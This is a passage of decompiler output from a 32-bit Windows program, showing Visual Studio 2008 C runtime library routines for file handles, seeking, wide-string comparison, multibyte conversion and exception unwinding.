      pbVar1 = (byte *)((&DAT_0046eb40)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
      __free_osfhnd(*in_EAX);
LAB_0041c025:
      piVar6 = __errno();
      return *piVar6;
    }
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)*in_EAX >> 5]) = pvVar10;
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wsopen_helper
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_helper(wchar_t *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004296d0;
  uStack_c = 0x41c4b7;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (wchar_t *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = __tsopen_nolock(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_0041c549();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_0041c549(void)

{
  byte *pbVar1;
  int unaff_EBP;
  int unaff_ESI;
  uint *unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_ESI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_ESI) {
      pbVar1 = (byte *)((&DAT_0046eb40)[(int)*unaff_EDI >> 5] + 4 + (*unaff_EDI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_EDI);
  }
  return;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = __wsopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __wcsnicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp_l(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  wint_t wVar3;
  wint_t wVar4;
  int iVar5;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  iVar5 = 0;
  if (_MaxCount != 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar6 = __errno();
      *piVar6 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      iVar5 = 0x7fffffff;
    }
    else {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          uVar8 = (uint)(ushort)wVar1;
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)(ushort)wVar2;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
      }
      else {
        do {
          wVar3 = __towlower_l(*_Str1,&local_14);
          uVar8 = (uint)wVar3;
          wVar4 = __towlower_l(*_Str2,&local_14);
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)wVar4;
          if ((_MaxCount == 0) || (wVar3 == 0)) break;
        } while (wVar3 == wVar4);
      }
      iVar5 = uVar8 - uVar7;
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int iVar3;
  int *piVar4;
  
  if (DAT_0042d8b8 == 0) {
    iVar3 = 0;
    if (_MaxCount != 0) {
      if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
        piVar4 = __errno();
        *piVar4 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        iVar3 = 0x7fffffff;
      }
      else {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
        iVar3 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
      }
    }
  }
  else {
    iVar3 = __wcsnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar3;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return 0;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x41c778,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_0041c780;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_0041c894();
    }
  }
  ExceptionList = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_0042be78 = param_1;
  DAT_0042be74 = in_EAX;
  DAT_0042be7c = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_0042be78 = param_1;
  DAT_0042be74 = in_EAX;
  DAT_0042be7c = unaff_EBP;
  return;
}



void FUN_0041c894(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0041c8c8:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_0041c8c8;
      }
    }
    pbVar1 = (byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0046eb20)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
        puVar1 = ___doserrno();
        *puVar1 = 0;
        piVar2 = __errno();
        *piVar2 = 9;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        local_28._4_4_ = 0xffffffff;
        local_28._0_4_ = 0xffffffff;
      }
      else {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_0041ca2b();
      }
      goto LAB_0041ca25;
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_0041ca25:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_0041ca2b(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_0042d0d8 = _DAT_0042d0d8 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2008 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  uint uVar2;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
    return 0;
  }
  if ((_FileHandle < 0) || (DAT_0046eb20 <= (uint)_FileHandle)) {
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0;
  }
  else {
    uVar2 = (int)*(char *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
            0x40;
  }
  return uVar2;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  wint_t wVar1;
  BOOL BVar2;
  DWORD DVar3;
  UINT CodePage;
  wchar_t *lpWideCharStr;
  int cchWideChar;
  CHAR *lpMultiByteStr;
  int cbMultiByte;
  LPCSTR lpDefaultChar;
  LPBOOL lpUsedDefaultChar;
  DWORD local_14;
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  if (DAT_0042be80 != 0) {
    if (DAT_0042bfa4 == (HANDLE)0xfffffffe) {
      ___initconout();
    }
    if (DAT_0042bfa4 == (HANDLE)0xffffffff) goto LAB_0041cb8e;
    BVar2 = WriteConsoleW(DAT_0042bfa4,&_WCh,1,&local_14,(LPVOID)0x0);
    if (BVar2 != 0) {
      DAT_0042be80 = 1;
      goto LAB_0041cb8e;
    }
    if ((DAT_0042be80 != 2) || (DVar3 = GetLastError(), DVar3 != 0x78)) goto LAB_0041cb8e;
    DAT_0042be80 = 0;
  }
  lpUsedDefaultChar = (LPBOOL)0x0;
  lpDefaultChar = (LPCSTR)0x0;
  cbMultiByte = 5;
  lpMultiByteStr = local_10;
  cchWideChar = 1;
  lpWideCharStr = &_WCh;
  DVar3 = 0;
  CodePage = GetConsoleOutputCP();
  DVar3 = WideCharToMultiByte(CodePage,DVar3,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  if (DAT_0042bfa4 != (HANDLE)0xffffffff) {
    WriteConsoleA(DAT_0042bfa4,local_10,DVar3,&local_14,(LPVOID)0x0);
  }
LAB_0041cb8e:
  wVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar1;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_0041cbf6;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_0041cbf6:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2008 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2008 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2008 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0046eb20)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_0046eb40)[param_1 >> 5]) == -1) {
      if (DAT_0042b090 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0041cdb8;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_0041cdb8:
      *(intptr_t *)(iVar3 + (&DAT_0046eb40)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __free_osfhnd(int param_1)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0046eb20)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    piVar1 = (int *)((&DAT_0046eb40)[param_1 >> 5] + iVar3);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_0042b090 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0041ce3e;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0041ce3e:
      *(undefined4 *)(iVar3 + (&DAT_0046eb40)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2008 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  intptr_t *piVar3;
  intptr_t iVar4;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if (((_FileHandle < 0) || (DAT_0046eb20 <= (uint)_FileHandle)) ||
     (piVar3 = (intptr_t *)((_FileHandle & 0x1fU) * 0x40 + (&DAT_0046eb40)[_FileHandle >> 5]),
     (*(byte *)(piVar3 + 1) & 1) == 0)) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar4 = -1;
  }
  else {
    iVar4 = *piVar3;
  }
  return iVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2008 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_0046eb40)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_0041cf70();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_0046eb40)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_0041cf70(void)

{
  FUN_00412cbf(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_0046eb40)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 *puVar4;
  int iVar5;
  int local_20;
  
  local_20 = -1;
  iVar5 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
  else {
    __lock(0xb);
    for (; iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_0046eb40)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar4 != (undefined4 *)0x0) {
          (&DAT_0046eb40)[iVar5] = puVar4;
          DAT_0046eb20 = DAT_0046eb20 + 0x20;
          for (; puVar4 < (undefined4 *)((&DAT_0046eb40)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
            *(undefined *)(puVar4 + 1) = 0;
            *puVar4 = 0xffffffff;
            *(undefined *)((int)puVar4 + 5) = 10;
            puVar4[2] = 0;
          }
          local_20 = iVar5 << 5;
          *(undefined *)((&DAT_0046eb40)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar4 < (undefined4 *)((&DAT_0046eb40)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            __lock(10);
            if (puVar4[2] == 0) {
              BVar3 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(puVar4 + 3),4000);
              if (BVar3 == 0) {
                bVar1 = true;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            FUN_0041d073();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              *(undefined *)(puVar4 + 1) = 1;
              *puVar4 = 0xffffffff;
              local_20 = ((int)puVar4 - (&DAT_0046eb40)[iVar5] >> 6) + iVar5 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_0041d131();
  }
  return local_20;
}



void FUN_0041d073(void)

{
  FUN_00412cbf(10);
  return;
}



void FUN_0041d131(void)

{
  FUN_00412cbf(0xb);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2008 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0046eb20)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_0046eb40)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_0046eb40)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_0041d1fc;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_0041d1fc:
        FUN_0041d211();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0041d211(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2008 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (param_1 < 0x30) {
    return -1;
  }
  if (param_1 < 0x3a) {
    return param_1 - 0x30;
  }
  iVar1 = 0xff10;
  if (param_1 < 0xff10) {
    iVar1 = 0x660;
    if (param_1 < 0x660) {
      return -1;
    }
    if (param_1 < 0x66a) goto LAB_0041d267;
    iVar1 = 0x6f0;
    if (param_1 < 0x6f0) {
      return -1;
    }
    if (param_1 < 0x6fa) goto LAB_0041d267;
    iVar1 = 0x966;
    if (param_1 < 0x966) {
      return -1;
    }
    if (param_1 < 0x970) goto LAB_0041d267;
    iVar1 = 0x9e6;
    if (param_1 < 0x9e6) {
      return -1;
    }
    if (param_1 < 0x9f0) goto LAB_0041d267;
    iVar1 = 0xa66;
    if (param_1 < 0xa66) {
      return -1;
    }
    if (param_1 < 0xa70) goto LAB_0041d267;
    iVar1 = 0xae6;
    if (param_1 < 0xae6) {
      return -1;
    }
    if (param_1 < 0xaf0) goto LAB_0041d267;
    iVar1 = 0xb66;
    if (param_1 < 0xb66) {
      return -1;
    }
    if (param_1 < 0xb70) goto LAB_0041d267;
    iVar1 = 0xc66;
    if (param_1 < 0xc66) {
      return -1;
    }
    if (param_1 < 0xc70) goto LAB_0041d267;
    iVar1 = 0xce6;
    if (param_1 < 0xce6) {
      return -1;
    }
    if (param_1 < 0xcf0) goto LAB_0041d267;
    iVar1 = 0xd66;
    if (param_1 < 0xd66) {
      return -1;
    }
    if (param_1 < 0xd70) goto LAB_0041d267;
    iVar1 = 0xe50;
    if (param_1 < 0xe50) {
      return -1;
    }
    if (param_1 < 0xe5a) goto LAB_0041d267;
    iVar1 = 0xed0;
    if (param_1 < 0xed0) {
      return -1;
    }
    if (param_1 < 0xeda) goto LAB_0041d267;
    iVar1 = 0xf20;
    if (param_1 < 0xf20) {
      return -1;
    }
    if (param_1 < 0xf2a) goto LAB_0041d267;
    iVar1 = 0x1040;
    if (param_1 < 0x1040) {
      return -1;
    }
    if (param_1 < 0x104a) goto LAB_0041d267;
    iVar1 = 0x17e0;
